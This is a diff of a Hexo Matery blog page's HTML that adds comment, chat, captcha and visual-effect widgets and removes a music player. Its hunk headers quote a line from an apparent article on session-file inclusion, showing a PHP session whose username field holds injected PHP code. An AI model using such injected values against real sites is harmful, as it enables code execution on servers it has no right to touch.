+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
+        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
+        serverURLs: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
 
     
 
@@ -1094,9 +1485,12 @@ session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-<!-- 代码语言 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+
+
+<!-- 代码语言 -->
 
 
 <!-- 代码块复制 -->
@@ -1106,7 +1500,6 @@ session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
     </div>
@@ -1136,19 +1529,6 @@ session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
             headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
         });
 
         // Set scroll toc fixed.
@@ -1212,89 +1592,42 @@ session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
 
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
-
-    
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
                 <span id="year">2019-2024</span>
             
-            <span id="year">2019</span>
             <a href="/about" target="_blank">hybcx</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
             <br>
             
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">861.1k</span>
             
             
             
+                
             
             
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
             </span>
             
             
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
             </span>
             
             <br>
+
+            <!-- 运行天数提醒. -->
             
             <br>
             
@@ -1441,6 +1774,30 @@ $(function () {
 });
 </script>
 
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
     <!-- 回到顶部按钮 -->
 <div id="backTop" class="top-scroll">
     <a class="btn-floating btn-large waves-effect waves-light" href="#!">
@@ -1455,6 +1812,33 @@ $(function () {
     <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
     <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
     <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
 
     <!-- Baidu Analytics -->
 
@@ -1482,10 +1866,39 @@ $(function () {
     
 
     
+        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
+        <script>
+            $(document).ready(function () {
+                setInterval(change_Tidio, 50);
+                function change_Tidio() {
+                    var tidio=$("#tidio-chat iframe");
+                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                    }
+                }
+            });
+        </script>
+    
 
     
 
-	
+    <!--腾讯兔小巢-->
+    
     
 
     
@@ -1496,6 +1909,6 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 
 </html>
